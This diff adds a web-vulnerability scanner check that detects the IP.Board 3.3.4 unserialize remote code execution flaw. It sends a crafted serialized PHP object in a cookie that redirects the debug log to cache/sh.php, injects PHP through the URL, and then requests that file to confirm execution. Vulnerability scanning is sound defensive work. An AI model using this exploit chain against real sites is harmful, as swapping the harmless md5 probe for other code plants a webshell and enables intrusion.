@@ -1,0 +1,66 @@
+#include helpers.inc;
+#include reporting_helpers.inc;
+#include string_helpers.inc;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+  if (matchedText) 
+    ri.Details =  "PHP code was injected and executed from file [blue]cache/sh.php[/blue]";
+	AddReportItem(ri);	
+}
+// **************************************************************************************
+function test_ipb334_remote_code_execution(dir, path){
+	if (!path.endsWith('/')) path = path + '/';
+	
+	var http = new THTTPJob();
+	http.url = dir.url;
+	http.verb = 'GET';
+	http.uri = path + 'index.php';
+	http.addCookies = false;
+	
+	http.execute();	
+	
+	if ((!http.wasError && http.responseStatus == 200)){
+		val = http.response.headerValue('Set-Cookie');
+		prefix = '';
+		pos = val.indexOf("session_id");
+		if (pos >= 0) {
+			prefix = val.substr(0, pos);
+		}	
+	
+		var http2 = new THTTPJob();
+		http2.url = dir.url;
+		http2.verb = 'GET';
+		http2.uri = path + 'index.php?<?print(md5(acunetix));die;?>';
+		http2.request.addHeader('Cookie', prefix + 'member_id=a%3A1%3A%7Bi%3A0%3BO%3A15%3A%22db_driver_mysql%22%3A1%3A%7Bs%3A3%3A%22obj%22%3Ba%3A2%3A%7Bs%3A13%3A%22use_debug_log%22%3Bi%3A1%3Bs%3A9%3A%22debug_log%22%3Bs%3A12%3A%22cache%2Fsh.php%22%3B%7D%7D%7D', true);
+		http2.execute();			
+		
+		if ((!http2.wasError && http2.responseStatus == 200)){
+		
+			var http3 = new THTTPJob();
+			http3.url = dir.url;
+			http3.verb = 'GET';
+			http3.uri = path + 'cache/sh.php';
+			
+			http3.execute();	
+	
+			if ((!http3.wasError && http3.responseStatus == 200)){
+				if (http3.response.body.indexOf("082119f75623eb7abd7bf357698ff66c")) 				
+				alert(http2.uri, "ipb_334_unserialize.xml", http2, "082119f75623eb7abd7bf357698ff66c");
+			}	
+		}
+	}
+}
+var dir = getCurrentDirectory();
+var alreadyReportedWebApplication = getGlobalValue("detectedAppIP.Board");
+if (!alreadyReportedWebApplication)
+{
+    setGlobalValue("detectedAppIP.Board", 1, true);           
+    KBase("IP.Board web application", "IP.Board web application was detected in directory [dark][bold]" + dir.fullPath + "[/bold][/dark].");
+}
+test_ipb334_remote_code_execution(dir, dir.fullPath);
